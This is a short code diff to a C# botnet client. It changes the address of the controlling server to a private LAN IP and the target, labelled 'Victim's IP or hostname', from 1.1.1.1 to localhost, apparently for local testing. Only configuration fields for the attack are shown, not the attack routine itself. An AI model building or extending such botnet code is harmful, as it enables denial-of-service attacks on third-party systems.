@@ -23,10 +23,11 @@ namespace BotnetClient
         // Client thread
         Thread clientThread;
         // Host Server Settings
-        string serverIPV4 = "192.168.1.44"; // IPV4 of host server (for lan)
+        //string serverIPV4 = "192.168.1.44"; // IPV4 of host server (for lan)
+        string serverIPV4 = "10.35.24.225"; // IPV4 of host server (for lan)
         Int32 serverPort = 11111; // Server Port
         // Attack Settings
-        static string HostOrIP = "1.1.1.1"; // Victim's IP or hostname
+        static string HostOrIP = "localhost"; // Victim's IP or hostname
         static int Port = 80; // Victim's port
         static bool UseSsl = false; // Will we use SSL when attacking?
         static bool restart = false; // If this gets set to true, the client will restart
